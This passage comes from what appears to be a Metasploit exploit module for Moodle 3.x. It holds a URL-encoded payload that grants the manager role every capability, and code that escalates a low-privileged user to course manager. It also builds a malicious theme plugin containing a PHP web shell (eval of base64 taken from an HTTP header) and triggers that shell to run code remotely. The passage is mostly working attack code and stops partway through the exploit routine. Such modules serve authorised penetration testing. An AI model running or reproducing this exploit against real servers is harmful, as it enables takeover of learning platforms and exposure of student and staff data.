e%2Ftag%3Amanage=1&moodle%2Fuser%3Achangeownpassword=1&moodle%2Fuser%3Acreate=1&moodle%2Fuser%3Adelete=1&moodle%2Fuser%3Aeditownmessageprofile=1&moodle%2Fuser%3Aeditownprofile=1&moodle%2Fuser%3Aignoreuserquota=1&moodle%2Fuser%3Amanageownblocks=1&moodle%2Fuser%3Amanageownfiles=1&moodle%2Fuser%3Amanagesyspages=1&moodle%2Fuser%3Aupdate=1&moodle%2Fwebservice%3Acreatemobiletoken=1&moodle%2Fwebservice%3Acreatetoken=1&moodle%2Fwebservice%3Amanagealltokens=1&quizaccess%2Fseb%3Amanagetemplates=1&report%2Fcourseoverview%3Aview=1&report%2Fperformance%3Aview=1&report%2Fquestioninstances%3Aview=1&report%2Fsecurity%3Aview=1&report%2Fstatus%3Aview=1&tool%2Fcustomlang%3Aedit=1&tool%2Fcustomlang%3Aview=1&tool%2Fdataprivacy%3Amanagedataregistry=1&tool%2Fdataprivacy%3Amanagedatarequests=1&tool%2Fdataprivacy%3Arequestdeleteforotheruser=1&tool%2Flpmigrate%3Aframeworksmigrate=1&tool%2Fmonitor%3Amanagetool=1&tool%2Fpolicy%3Aaccept=1&tool%2Fpolicy%3Amanagedocs=1&tool%2Fpolicy%3Aviewacceptances=1&tool%2Fuploaduser%3Auploaduserpictures=1&tool%2Fusertours%3Amanagetours=1&auth%2Foauth2%3Amanagelinkedlogins=1&moodle%2Fbadges%3Amanageownbadges=1&moodle%2Fbadges%3Aviewotherbadges=1&moodle%2Fcompetency%3Aevidencedelete=1&moodle%2Fcompetency%3Aplancomment=1&moodle%2Fcompetency%3Aplancommentown=1&moodle%2Fcompetency%3Aplanmanage=1&moodle%2Fcompetency%3Aplanmanagedraft=1&moodle%2Fcompetency%3Aplanmanageown=1&moodle%2Fcompetency%3Aplanmanageowndraft=1&moodle%2Fcompetency%3Aplanrequestreview=1&moodle%2Fcompetency%3Aplanrequestreviewown=1&moodle%2Fcompetency%3Aplanreview=1&moodle%2Fcompetency%3Aplanview=1&moodle%2Fcompetency%3Aplanviewdraft=1&moodle%2Fcompetency%3Aplanviewown=1&moodle%2Fcompetency%3Aplanviewowndraft=1&moodle%2Fcompetency%3Ausercompetencycomment=1&moodle%2Fcompetency%3Ausercompetencycommentown=1&moodle%2Fcompetency%3Ausercompetencyrequestreview=1&moodle%2Fcompetency%3Ausercompetencyrequestreviewown=1&moodle%2Fcompetency%3Ausercompetencyreview=1&moodle%2Fcompetency%3Ausercompetencyview=1&moodle%2Fcompetency%3Auserevidencemanage=1&moodle%2Fcompetency%3Auserevidencemanageown=0&moodle%2Fcompetency%3Auserevidenceview=1&moodle%2Fuser%3Aeditmessageprofile=1&moodle%2Fuser%3Aeditprofile=1&moodle%2Fuser%3Amanageblocks=1&moodle%2Fuser%3Areaduserblogs=1&moodle%2Fuser%3Areaduserposts=1&moodle%2Fuser%3Aviewalldetails=1&moodle%2Fuser%3Aviewlastip=1&moodle%2Fuser%3Aviewuseractivitiesreport=1&report%2Fusersessions%3Amanageownsessions=1&tool%2Fdataprivacy%3Adownloadallrequests=1&tool%2Fdataprivacy%3Adownloadownrequest=1&tool%2Fdataprivacy%3Amakedatadeletionrequestsforchildren=1&tool%2Fdataprivacy%3Amakedatarequestsforchildren=1&tool%2Fdataprivacy%3Arequestdelete=1&tool%2Fpolicy%3Aacceptbehalf=1&moodle%2Fcategory%3Amanage=1&moodle%2Fcategory%3Aviewcourselist=1&moodle%2Fcategory%3Aviewhiddencategories=1&moodle%2Fcohort%3Aassign=1&moodle%2Fcohort%3Amanage=1&moodle%2Fcompetency%3Acompetencymanage=1&moodle%2Fcompetency%3Acompetencyview=1&moodle%2Fcompetency%3Atemplatemanage=1&moodle%2Fcompetency%3Atemplateview=1&moodle%2Fcourse%3Acreate=1&moodle%2Fcourse%3Arequest=1&moodle%2Fsite%3Aapprovecourse=1&repository%2Fcontentbank%3Aaccesscoursecategorycontent=1&repository%2Fcontentbank%3Aaccessgeneralcontent=1&block%2Frecent_activity%3Aviewaddupdatemodule=1&block%2Frecent_activity%3Aviewdeletemodule=1&contenttype%2Fh5p%3Aaccess=1&contenttype%2Fh5p%3Aupload=1&contenttype%2Fh5p%3Auseeditor=1&enrol%2Fcategory%3Aconfig=1&enrol%2Fcohort%3Aconfig=1&enrol%2Fcohort%3Aunenrol=1&enrol%2Fdatabase%3Aconfig=1&enrol%2Fdatabase%3Aunenrol=1&enrol%2Fflatfile%3Amanage=1&enrol%2Fflatfile%3Aunenrol=1&enrol%2Fguest%3Aconfig=1&enrol%2Fimsenterprise%3Aconfig=1&enrol%2Fldap%3Amanage=1&enrol%2Flti%3Aconfig=1&enrol%2Flti%3Aunenrol=1&enrol%2Fmanual%3Aconfig=1&enrol%2Fmanual%3Aenrol=1&enrol%2Fmanual%3Amanage=1&enrol%2Fmanual%3Aunenrol=1&enrol%2Fmanual%3Aunenrolself=1&enrol%2Fmeta%3Aconfig=1&enrol%2Fmeta%3Aselectaslinked=1&enrol%2Fmeta%3Aunenrol=1&enrol%2Fmnet%3Aconfig=1&enrol%2Fpaypal%3Aconfig=1&enrol%2Fpaypal%3Amanage=1&enrol%2Fpaypal%3Aunenrol=1&enrol%2Fpaypal%3Aunenrolself=1&enrol%2Fself%3Aconfig=1&enrol%2Fself%3Aholdkey=1&enrol%2Fself%3Amanage=1&enrol%2Fself%3Aunenrol=1&enrol%2Fself%3Aunenrolself=1&gradeexport%2Fods%3Apublish=1&gradeexport%2Fods%3Aview=1&gradeexport%2Ftxt%3Apublish=1&gradeexport%2Ftxt%3Aview=1&gradeexport%2Fxls%3Apublish=1&gradeexport%2Fxls%3Aview=1&gradeexport%2Fxml%3Apublish=1&gradeexport%2Fxml%3Aview=1&gradeimport%2Fcsv%3Aview=1&gradeimport%2Fdirect%3Aview=1&gradeimport%2Fxml%3Apublish=1&gradeimport%2Fxml%3Aview=1&gradereport%2Fgrader%3Aview=1&gradereport%2Fhistory%3Aview=1&gradereport%2Foutcomes%3Aview=1&gradereport%2Foverview%3Aview=1&gradereport%2Fsingleview%3Aview=1&gradereport%2Fuser%3Aview=1&mod%2Fassign%3Aaddinstance=1&mod%2Fassignment%3Aaddinstance=1&mod%2Fbook%3Aaddinstance=1&mod%2Fchat%3Aaddinstance=1&mod%2Fchoice%3Aaddinstance=1&mod%2Fdata%3Aaddinstance=1&mod%2Ffeedback%3Aaddinstance=1&mod%2Ffolder%3Aaddinstance=1&mod%2Fforum%3Aaddinstance=1&mod%2Fglossary%3Aaddinstance=1&mod%2Fh5pactivity%3Aaddinstance=1&mod%2Fimscp%3Aaddinstance=1&mod%2Flabel%3Aaddinstance=1&mod%2Flesson%3Aaddinstance=1&mod%2Flti%3Aaddcoursetool=1&mod%2Flti%3Aaddinstance=1&mod%2Flti%3Aaddmanualinstance=1&mod%2Flti%3Aaddpreconfiguredinstance=1&mod%2Flti%3Arequesttooladd=1&mod%2Fpage%3Aaddinstance=1&mod%2Fquiz%3Aaddinstance=1&mod%2Fresource%3Aaddinstance=1&mod%2Fscorm%3Aaddinstance=1&mod%2Fsurvey%3Aaddinstance=1&mod%2Furl%3Aaddinstance=1&mod%2Fwiki%3Aaddinstance=1&mod%2Fworkshop%3Aaddinstance=1&moodle%2Fanalytics%3Alistinsights=1&moodle%2Fbackup%3Aanonymise=1&moodle%2Fbackup%3Abackupcourse=1&moodle%2Fbackup%3Abackupsection=1&moodle%2Fbackup%3Abackuptargetimport=1&moodle%2Fbackup%3Aconfigure=1&moodle%2Fbackup%3Adownloadfile=1&moodle%2Fbackup%3Auserinfo=1&moodle%2Fbadges%3Aawardbadge=1&moodle%2Fbadges%3Aconfigurecriteria=1&moodle%2Fbadges%3Aconfiguredetails=1&moodle%2Fbadges%3Aconfiguremessages=1&moodle%2Fbadges%3Acreatebadge=1&moodle%2Fbadges%3Adeletebadge=1&moodle%2Fbadges%3Aearnbadge=1&moodle%2Fbadges%3Arevokebadge=1&moodle%2Fbadges%3Aviewawarded=1&moodle%2Fbadges%3Aviewbadges=1&moodle%2Fcalendar%3Amanageentries=1&moodle%2Fcalendar%3Amanagegroupentries=1&moodle%2Fcalendar%3Amanageownentries=1&moodle%2Fcohort%3Aview=1&moodle%2Fcomment%3Adelete=1&moodle%2Fcomment%3Apost=1&moodle%2Fcomment%3Aview=1&moodle%2Fcompetency%3Acompetencygrade=1&moodle%2Fcompetency%3Acoursecompetencygradable=1&moodle%2Fcompetency%3Acoursecompetencymanage=1&moodle%2Fcompetency%3Acoursecompetencyview=1&moodle%2Fcontentbank%3Aaccess=1&moodle%2Fcontentbank%3Adeleteanycontent=1&moodle%2Fcontentbank%3Adeleteowncontent=1&moodle%2Fcontentbank%3Amanageanycontent=1&moodle%2Fcontentbank%3Amanageowncontent=1&moodle%2Fcontentbank%3Aupload=1&moodle%2Fcontentbank%3Auseeditor=1&moodle%2Fcourse%3Abulkmessaging=1&moodle%2Fcourse%3Achangecategory=1&moodle%2Fcourse%3Achangefullname=1&moodle%2Fcourse%3Achangeidnumber=1&moodle%2Fcourse%3Achangelockedcustomfields=1&moodle%2Fcourse%3Achangeshortname=1&moodle%2Fcourse%3Achangesummary=1&moodle%2Fcourse%3Acreategroupconversations=1&moodle%2Fcourse%3Adelete=1&moodle%2Fcourse%3Aenrolconfig=1&moodle%2Fcourse%3Aenrolreview=1&moodle%2Fcourse%3Aignorefilesizelimits=1&moodle%2Fcourse%3Aisincompletionreports=1&moodle%2Fcourse%3Amanagefiles=1&moodle%2Fcourse%3Amanagegroups=1&moodle%2Fcourse%3Amanagescales=1&moodle%2Fcourse%3Amarkcomplete=1&moodle%2Fcourse%3Amovesections=1&moodle%2Fcourse%3Aoverridecompletion=1&moodle%2Fcourse%3Arenameroles=1&moodle%2Fcourse%3Areset=1&moodle%2Fcourse%3Areviewotherusers=1&moodle%2Fcourse%3Asectionvisibility=1&moodle%2Fcourse%3Asetcurrentsection=1&moodle%2Fcourse%3Asetforcedlanguage=1&moodle%2Fcourse%3Atag=1&moodle%2Fcourse%3Aupdate=1&moodle%2Fcourse%3Auseremail=1&moodle%2Fcourse%3Aview=1&moodle%2Fcourse%3Aviewhiddencourses=1&moodle%2Fcourse%3Aviewhiddensections=1&moodle%2Fcourse%3Aviewhiddenuserfields=1&moodle%2Fcourse%3Aviewparticipants=1&moodle%2Fcourse%3Aviewscales=1&moodle%2Fcourse%3Aviewsuspendedusers=1&moodle%2Fcourse%3Avisibility=1&moodle%2Ffilter%3Amanage=1&moodle%2Fgrade%3Aedit=1&moodle%2Fgrade%3Aexport=1&moodle%2Fgrade%3Ahide=1&moodle%2Fgrade%3Aimport=1&moodle%2Fgrade%3Alock=1&moodle%2Fgrade%3Amanage=1&moodle%2Fgrade%3Amanagegradingforms=1&moodle%2Fgrade%3Amanageletters=1&moodle%2Fgrade%3Amanageoutcomes=1&moodle%2Fgrade%3Aunlock=1&moodle%2Fgrade%3Aview=1&moodle%2Fgrade%3Aviewall=1&moodle%2Fgrade%3Aviewhidden=1&moodle%2Fnotes%3Amanage=1&moodle%2Fnotes%3Aview=1&moodle%2Fquestion%3Aadd=1&moodle%2Fquestion%3Aeditall=1&moodle%2Fquestion%3Aeditmine=1&moodle%2Fquestion%3Aflag=1&moodle%2Fquestion%3Amanagecategory=1&moodle%2Fquestion%3Amoveall=1&moodle%2Fquestion%3Amovemine=1&moodle%2Fquestion%3Atagall=1&moodle%2Fquestion%3Atagmine=1&moodle%2Fquestion%3Auseall=1&moodle%2Fquestion%3Ausemine=1&moodle%2Fquestion%3Aviewall=1&moodle%2Fquestion%3Aviewmine=1&moodle%2Frating%3Arate=1&moodle%2Frating%3Aview=1&moodle%2Frating%3Aviewall=1&moodle%2Frating%3Aviewany=1&moodle%2Frestore%3Aconfigure=1&moodle%2Frestore%3Arestoreactivity=1&moodle%2Frestore%3Arestorecourse=1&moodle%2Frestore%3Arestoresection=1&moodle%2Frestore%3Arestoretargetimport=1&moodle%2Frestore%3Arolldates=1&moodle%2Frestore%3Auploadfile=1&moodle%2Frestore%3Auserinfo=1&moodle%2Frestore%3Aviewautomatedfilearea=1&moodle%2Frole%3Aassign=1&moodle%2Frole%3Aoverride=1&moodle%2Frole%3Areview=1&moodle%2Frole%3Asafeoverride=1&moodle%2Frole%3Aswitchroles=1&moodle%2Fsite%3Aviewreports=1&moodle%2Fuser%3Aloginas=1&moodle%2Fuser%3Aviewdetails=1&moodle%2Fuser%3Aviewhiddendetails=1&report%2Fcompletion%3Aview=1&report%2Flog%3Aview=1&report%2Flog%3Aviewtoday=1&report%2Floglive%3Aview=1&report%2Foutline%3Aview=1&report%2Foutline%3Aviewuserreport=1&report%2Fparticipation%3Aview=1&report%2Fprogress%3Aview=1&report%2Fstats%3Aview=1&repository%2Fcontentbank%3Aaccesscoursecontent=1&tool%2Fmonitor%3Amanagerules=1&tool%2Fmonitor%3Asubscribe=1&tool%2Frecyclebin%3Adeleteitems=1&tool%2Frecyclebin%3Arestoreitems=1&tool%2Frecyclebin%3Aviewitems=1&webservice%2Frest%3Ause=1&webservice%2Fsoap%3Ause=1&webservice%2Fxmlrpc%3Ause=1&atto%2Fh5p%3Aaddembed=1&atto%2Frecordrtc%3Arecordaudio=1&atto%2Frecordrtc%3Arecordvideo=1&booktool%2Fexportimscp%3Aexport=1&booktool%2Fimporthtml%3Aimport=1&booktool%2Fprint%3Aprint=1&forumreport%2Fsummary%3Aview=1&forumreport%2Fsummary%3Aviewall=1&mod%2Fassign%3Aeditothersubmission=1&mod%2Fassign%3Aexportownsubmission=1&mod%2Fassign%3Agrade=1&mod%2Fassign%3Agrantextension=1&mod%2Fassign%3Amanageallocations=1&mod%2Fassign%3Amanagegrades=1&mod%2Fassign%3Amanageoverrides=1&mod%2Fassign%3Areceivegradernotifications=1&mod%2Fassign%3Areleasegrades=1&mod%2Fassign%3Arevealidentities=1&mod%2Fassign%3Areviewgrades=1&mod%2Fassign%3Ashowhiddengrader=1&mod%2Fassign%3Asubmit=1&mod%2Fassign%3Aview=1&mod%2Fassign%3Aviewblinddetails=1&mod%2Fassign%3Aviewgrades=1&mod%2Fassignment%3Aexportownsubmission=1&mod%2Fassignment%3Agrade=1&mod%2Fassignment%3Asubmit=1&mod%2Fassignment%3Aview=1&mod%2Fbook%3Aedit=1&mod%2Fbook%3Aread=1&mod%2Fbook%3Aviewhiddenchapters=1&mod%2Fchat%3Achat=1&mod%2Fchat%3Adeletelog=1&mod%2Fchat%3Aexportparticipatedsession=1&mod%2Fchat%3Aexportsession=1&mod%2Fchat%3Areadlog=1&mod%2Fchat%3Aview=1&mod%2Fchoice%3Achoose=1&mod%2Fchoice%3Adeleteresponses=1&mod%2Fchoice%3Adownloadresponses=1&mod%2Fchoice%3Areadresponses=1&mod%2Fchoice%3Aview=1&mod%2Fdata%3Aapprove=1&mod%2Fdata%3Acomment=1&mod%2Fdata%3Aexportallentries=1&mod%2Fdata%3Aexportentry=1&mod%2Fdata%3Aexportownentry=1&mod%2Fdata%3Aexportuserinfo=1&mod%2Fdata%3Amanagecomments=1&mod%2Fdata%3Amanageentries=1&mod%2Fdata%3Amanagetemplates=1&mod%2Fdata%3Amanageuserpresets=1&mod%2Fdata%3Arate=1&mod%2Fdata%3Aview=1&mod%2Fdata%3Aviewallratings=1&mod%2Fdata%3Aviewalluserpresets=1&mod%2Fdata%3Aviewanyrating=1&mod%2Fdata%3Aviewentry=1&mod%2Fdata%3Aviewrating=1&mod%2Fdata%3Awriteentry=1&mod%2Ffeedback%3Acomplete=1&mod%2Ffeedback%3Acreateprivatetemplate=1&mod%2Ffeedback%3Acreatepublictemplate=1&mod%2Ffeedback%3Adeletesubmissions=1&mod%2Ffeedback%3Adeletetemplate=1&mod%2Ffeedback%3Aedititems=1&mod%2Ffeedback%3Amapcourse=1&mod%2Ffeedback%3Areceivemail=1&mod%2Ffeedback%3Aview=1&mod%2Ffeedback%3Aviewanalysepage=1&mod%2Ffeedback%3Aviewreports=1&mod%2Ffolder%3Amanagefiles=1&mod%2Ffolder%3Aview=1&mod%2Fforum%3Aaddnews=1&mod%2Fforum%3Aaddquestion=1&mod%2Fforum%3Aallowforcesubscribe=1&mod%2Fforum%3Acanoverridecutoff=1&mod%2Fforum%3Acanoverridediscussionlock=1&mod%2Fforum%3Acanposttomygroups=1&mod%2Fforum%3Acantogglefavourite=1&mod%2Fforum%3Acreateattachment=1&mod%2Fforum%3Adeleteanypost=1&mod%2Fforum%3Adeleteownpost=1&mod%2Fforum%3Aeditanypost=1&mod%2Fforum%3Aexportdiscussion=1&mod%2Fforum%3Aexportforum=1&mod%2Fforum%3Aexportownpost=1&mod%2Fforum%3Aexportpost=1&mod%2Fforum%3Agrade=1&mod%2Fforum%3Amanagesubscriptions=1&mod%2Fforum%3Amovediscussions=1&mod%2Fforum%3Apindiscussions=1&mod%2Fforum%3Apostprivatereply=1&mod%2Fforum%3Apostwithoutthrottling=1&mod%2Fforum%3Arate=1&mod%2Fforum%3Areadprivatereplies=1&mod%2Fforum%3Areplynews=1&mod%2Fforum%3Areplypost=1&mod%2Fforum%3Asplitdiscussions=1&mod%2Fforum%3Astartdiscussion=1&mod%2Fforum%3Aviewallratings=1&mod%2Fforum%3Aviewanyrating=1&mod%2Fforum%3Aviewdiscussion=1&mod%2Fforum%3Aviewhiddentimedposts=1&mod%2Fforum%3Aviewqandawithoutposting=1&mod%2Fforum%3Aviewrating=1&mod%2Fforum%3Aviewsubscribers=1&mod%2Fglossary%3Aapprove=1&mod%2Fglossary%3Acomment=1&mod%2Fglossary%3Aexport=1&mod%2Fglossary%3Aexportentry=1&mod%2Fglossary%3Aexportownentry=1&mod%2Fglossary%3Aimport=1&mod%2Fglossary%3Amanagecategories=1&mod%2Fglossary%3Amanagecomments=1&mod%2Fglossary%3Amanageentries=1&mod%2Fglossary%3Arate=1&mod%2Fglossary%3Aview=1&mod%2Fglossary%3Aviewallratings=1&mod%2Fglossary%3Aviewanyrating=1&mod%2Fglossary%3Aviewrating=1&mod%2Fglossary%3Awrite=1&mod%2Fh5pactivity%3Areviewattempts=1&mod%2Fh5pactivity%3Asubmit=1&mod%2Fh5pactivity%3Aview=1&mod%2Fimscp%3Aview=1&mod%2Flabel%3Aview=1&mod%2Flesson%3Aedit=1&mod%2Flesson%3Agrade=1&mod%2Flesson%3Amanage=1&mod%2Flesson%3Amanageoverrides=1&mod%2Flesson%3Aview=1&mod%2Flesson%3Aviewreports=1&mod%2Flti%3Aadmin=1&mod%2Flti%3Amanage=1&mod%2Flti%3Aview=1&mod%2Fpage%3Aview=1&mod%2Fquiz%3Aattempt=1&mod%2Fquiz%3Adeleteattempts=1&mod%2Fquiz%3Aemailconfirmsubmission=1&mod%2Fquiz%3Aemailnotifysubmission=1&mod%2Fquiz%3Aemailwarnoverdue=1&mod%2Fquiz%3Agrade=1&mod%2Fquiz%3Aignoretimelimits=1&mod%2Fquiz%3Amanage=1&mod%2Fquiz%3Amanageoverrides=1&mod%2Fquiz%3Apreview=1&mod%2Fquiz%3Aregrade=1&mod%2Fquiz%3Areviewmyattempts=1&mod%2Fquiz%3Aview=1&mod%2Fquiz%3Aviewreports=1&mod%2Fresource%3Aview=1&mod%2Fscorm%3Adeleteownresponses=1&mod%2Fscorm%3Adeleteresponses=1&mod%2Fscorm%3Asavetrack=1&mod%2Fscorm%3Askipview=1&mod%2Fscorm%3Aviewreport=1&mod%2Fscorm%3Aviewscores=1&mod%2Fsurvey%3Adownload=1&mod%2Fsurvey%3Aparticipate=1&mod%2Fsurvey%3Areadresponses=1&mod%2Furl%3Aview=1&mod%2Fwiki%3Acreatepage=1&mod%2Fwiki%3Aeditcomment=1&mod%2Fwiki%3Aeditpage=1&mod%2Fwiki%3Amanagecomment=1&mod%2Fwiki%3Amanagefiles=1&mod%2Fwiki%3Amanagewiki=1&mod%2Fwiki%3Aoverridelock=1&mod%2Fwiki%3Aviewcomment=1&mod%2Fwiki%3Aviewpage=1&mod%2Fworkshop%3Aallocate=1&mod%2Fworkshop%3Adeletesubmissions=1&mod%2Fworkshop%3Aeditdimensions=1&mod%2Fworkshop%3Aexportsubmissions=1&mod%2Fworkshop%3Aignoredeadlines=1&mod%2Fworkshop%3Amanageexamples=1&mod%2Fworkshop%3Aoverridegrades=1&mod%2Fworkshop%3Apeerassess=1&mod%2Fworkshop%3Apublishsubmissions=1&mod%2Fworkshop%3Asubmit=1&mod%2Fworkshop%3Aswitchphase=1&mod%2Fworkshop%3Aview=1&mod%2Fworkshop%3Aviewallassessments=1&mod%2Fworkshop%3Aviewallsubmissions=1&mod%2Fworkshop%3Aviewauthornames=1&mod%2Fworkshop%3Aviewauthorpublished=1&mod%2Fworkshop%3Aviewpublishedsubmissions=1&mod%2Fworkshop%3Aviewreviewernames=1&moodle%2Fbackup%3Abackupactivity=1&moodle%2Fcompetency%3Acoursecompetencyconfigure=1&moodle%2Fcourse%3Aactivityvisibility=1&moodle%2Fcourse%3Aignoreavailabilityrestrictions=1&moodle%2Fcourse%3Amanageactivities=1&moodle%2Fcourse%3Atogglecompletion=1&moodle%2Fcourse%3Aviewhiddenactivities=1&moodle%2Fh5p%3Adeploy=1&moodle%2Fh5p%3Asetdisplayoptions=1&moodle%2Fh5p%3Aupdatelibraries=1&moodle%2Fsite%3Aaccessallgroups=1&moodle%2Fsite%3Amanagecontextlocks=1&moodle%2Fsite%3Atrustcontent=1&moodle%2Fsite%3Aviewanonymousevents=1&moodle%2Fsite%3Aviewfullnames=1&moodle%2Fsite%3Aviewuseridentity=1&quiz%2Fgrading%3Aviewidnumber=1&quiz%2Fgrading%3Aviewstudentnames=1&quiz%2Fstatistics%3Aview=1&quizaccess%2Fseb%3Abypassseb=1&quizaccess%2Fseb%3Amanage_filemanager_sebconfigfile=1&quizaccess%2Fseb%3Amanage_seb_activateurlfiltering=1&quizaccess%2Fseb%3Amanage_seb_allowedbrowserexamkeys=1&quizaccess%2Fseb%3Amanage_seb_allowreloadinexam=1&quizaccess%2Fseb%3Amanage_seb_allowspellchecking=1&quizaccess%2Fseb%3Amanage_seb_allowuserquitseb=1&quizaccess%2Fseb%3Amanage_seb_enableaudiocontrol=1&quizaccess%2Fseb%3Amanage_seb_expressionsallowed=1&quizaccess%2Fseb%3Amanage_seb_expressionsblocked=1&quizaccess%2Fseb%3Amanage_seb_filterembeddedcontent=1&quizaccess%2Fseb%3Amanage_seb_linkquitseb=1&quizaccess%2Fseb%3Amanage_seb_muteonstartup=1&quizaccess%2Fseb%3Amanage_seb_quitpassword=1&quizaccess%2Fseb%3Amanage_seb_regexallowed=1&quizaccess%2Fseb%3Amanage_seb_regexblocked=1&quizaccess%2Fseb%3Amanage_seb_requiresafeexambrowser=1&quizaccess%2Fseb%3Amanage_seb_showkeyboardlayout=1&quizaccess%2Fseb%3Amanage_seb_showreloadbutton=1&quizaccess%2Fseb%3Amanage_seb_showsebdownloadlink=1&quizaccess%2Fseb%3Amanage_seb_showsebtaskbar=1&quizaccess%2Fseb%3Amanage_seb_showtime=1&quizaccess%2Fseb%3Amanage_seb_showwificontrol=1&quizaccess%2Fseb%3Amanage_seb_templateid=1&quizaccess%2Fseb%3Amanage_seb_userconfirmquit=1&repository%2Fareafiles%3Aview=1&repository%2Fboxnet%3Aview=1&repository%2Fcontentbank%3Aview=1&repository%2Fcoursefiles%3Aview=1&repository%2Fdropbox%3Aview=1&repository%2Fequella%3Aview=1&repository%2Ffilesystem%3Aview=1&repository%2Fflickr%3Aview=1&repository%2Fflickr_public%3Aview=1&repository%2Fgoogledocs%3Aview=1&repository%2Flocal%3Aview=1&repository%2Fmerlot%3Aview=0&repository%2Fnextcloud%3Aview=1&repository%2Fonedrive%3Aview=1&repository%2Fpicasa%3Aview=1&repository%2Frecent%3Aview=1&repository%2Fs3%3Aview=1&repository%2Fskydrive%3Aview=1&repository%2Fupload%3Aview=1&repository%2Furl%3Aview=1&repository%2Fuser%3Aview=1&repository%2Fwebdav%3Aview=1&repository%2Fwikimedia%3Aview=1&repository%2Fyoutube%3Aview=1&block%2Factivity_modules%3Aaddinstance=1&block%2Factivity_results%3Aaddinstance=1&block%2Fadmin_bookmarks%3Aaddinstance=1&block%2Fbadges%3Aaddinstance=1&block%2Fblog_menu%3Aaddinstance=1&block%2Fblog_recent%3Aaddinstance=1&block%2Fblog_tags%3Aaddinstance=1&block%2Fcalendar_month%3Aaddinstance=1&block%2Fcalendar_upcoming%3Aaddinstance=1&block%2Fcomments%3Aaddinstance=1&block%2Fcompletionstatus%3Aaddinstance=1&block%2Fcourse_list%3Aaddinstance=1&block%2Fcourse_summary%3Aaddinstance=1&block%2Ffeedback%3Aaddinstance=1&block%2Fglobalsearch%3Aaddinstance=1&block%2Fglossary_random%3Aaddinstance=1&block%2Fhtml%3Aaddinstance=1&block%2Flogin%3Aaddinstance=1&block%2Fmentees%3Aaddinstance=1&block%2Fmnet_hosts%3Aaddinstance=1&block%2Fmyprofile%3Aaddinstance=1&block%2Fnavigation%3Aaddinstance=1&block%2Fnews_items%3Aaddinstance=1&block%2Fonline_users%3Aaddinstance=1&block%2Fonline_users%3Aviewlist=1&block%2Fprivate_files%3Aaddinstance=1&block%2Fquiz_results%3Aaddinstance=1&block%2Frecent_activity%3Aaddinstance=1&block%2Frss_client%3Aaddinstance=1&block%2Frss_client%3Amanageanyfeeds=1&block%2Frss_client%3Amanageownfeeds=1&block%2Fsearch_forums%3Aaddinstance=1&block%2Fsection_links%3Aaddinstance=1&block%2Fselfcompletion%3Aaddinstance=1&block%2Fsettings%3Aaddinstance=1&block%2Fsite_main_menu%3Aaddinstance=1&block%2Fsocial_activities%3Aaddinstance=1&block%2Ftag_flickr%3Aaddinstance=1&block%2Ftag_youtube%3Aaddinstance=1&block%2Ftags%3Aaddinstance=1&moodle%2Fblock%3Aedit=1&moodle%2Fblock%3Aview=1&moodle%2Fsite%3Amanageblocks=1&savechanges=Save+changes"
  end

  def set_manager_permissions(permissions)
    # we need raw for repeated data properties where a dict overwrites them
    res = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'admin', 'roles', 'define.php?roleid=1&action=edit'),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/x-www-form-urlencoded' },
      'cookie' => "#{cookie_jar.cookies[0].name}=#{cookie_jar.cookies[0].value}",
      'data' => permissions
    })
    fail_with(Failure::Unreachable, 'Error changing manager role permissions') unless res
  end

  # copy from moodle_admin_shell_upload
  def create_addon_file
    # There are syntax errors in creating zip file. So the payload was sent as base64.
    plugin_file = Rex::Zip::Archive.new
    header = Rex::Text.rand_text_alpha_upper(4)
    plugin_name = Rex::Text.rand_text_alpha_lower(8)

    print_status("Creating plugin named: #{plugin_name} with poisoned header: #{header}")

    path = "#{plugin_name}/version.php"
    path2 = "#{plugin_name}/lang/en/theme_#{plugin_name}.php"
    # "$plugin->version" and "$plugin->component" contents are required to accept Moodle plugin.
    plugin_file.add_file(path, "<?php $plugin->version = #{Time.now.to_time.to_i}; $plugin->component = 'theme_#{plugin_name}';")
    plugin_file.add_file(path2, "<?php eval(base64_decode($_SERVER['HTTP_#{header}'])); ?>")
    # plugin_file.add_file(path2, "<?php #{payload.encoded}) ?>")
    return plugin_file.pack, header, plugin_name
  end

  # copy from moodle_admin_shell_upload
  def exec_code(plugin_name, header)
    # Base64 was encoded in "PHP". This process was sent as "HTTP headers".
    print_status('Triggering payload')
    send_request_cgi({
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri.path, 'theme', plugin_name, 'lang', 'en', "theme_#{plugin_name}.php"),
      'raw_headers' => "#{header}: #{Rex::Text.encode_base64(payload.encoded)}\r\n"
    })
  end

  def check
    return CheckCode::Unknown('No web server or moodle instance found') unless moodle_and_online?

    v = moodle_version
    return CheckCode::Detected('Unable to determine moodle version') if v.nil?

    # https://moodle.org/mod/forum/discuss.php?d=407393
    v = Rex::Version.new(v)
    if v.between?(Rex::Version.new('3.9'), Rex::Version.new('3.9.1')) ||
       v.between?(Rex::Version.new('3.8'), Rex::Version.new('3.8.4')) ||
       v.between?(Rex::Version.new('3.7'), Rex::Version.new('3.7.7')) ||
       v.between?(Rex::Version.new('3.5'), Rex::Version.new('3.5.13')) ||
       v.between?(Rex::Version.new('3'), Rex::Version.new('3.5'))
      return CheckCode::Appears("Exploitable Moodle version #{v} detected")
    end

    CheckCode::Safe("Non-exploitable Moodle version #{v} detected")
  end

  def exploit
    v = moodle_version
    return CheckCode::Detected('Unable to determine moodle version') if v.nil?

    version = Rex::Version.new(v)

    print_status("Authenticating as user: #{datastore['USERNAME']}")
    cookies = moodle_login(datastore['USERNAME'], datastore['PASSWORD'])
    fail_with(Failure::NoAccess, 'Unable to login. Check credentials') if cookies.nil? || cookies.empty?
    cookies.each do |cookie|
      cookie_jar.add(cookie)
    end

    userid, courseid, sesskey = get_user_info
    print_good("User ID: #{userid}")
    print_good("Course ID: #{courseid}")
    print_good("Sessionkey: #{sesskey}")
    print_status('Retrieving course enrollment id')
    enrolid = get_course_enrol_id(courseid)
    print_good("Enrol ID: #{enrolid}")
    print_status('Attempting to enrolin in class as manager (priv esc)')
    success = enrol(userid, courseid, enrolid, sesskey)
    fail_with(Failure::NoAccess, 'Unable to enrol in course as manager') unless success
    print_good('Successfully enrolled')
    print_status('Attempting to find and add a manager to class')
    Array(2...datastore['MAXUSERS']).each do |id|
      next if id == userid

      print_status("Attempting user: #{id}")
      success = enrol(id, courseid, enrolid, sesskey, '5')
      if success
        print_good('Successfully enrolled')
      else
        print_bad('Unsuccessful')
      end
    end
    print_status('Retrieving course context id')
    contextid = get_course_context_id(courseid)
    print_good("Context ID: #{contextid}")
    managers = get_course_managers(contextid)
    print_good("Found manager user IDs: #{managers}")
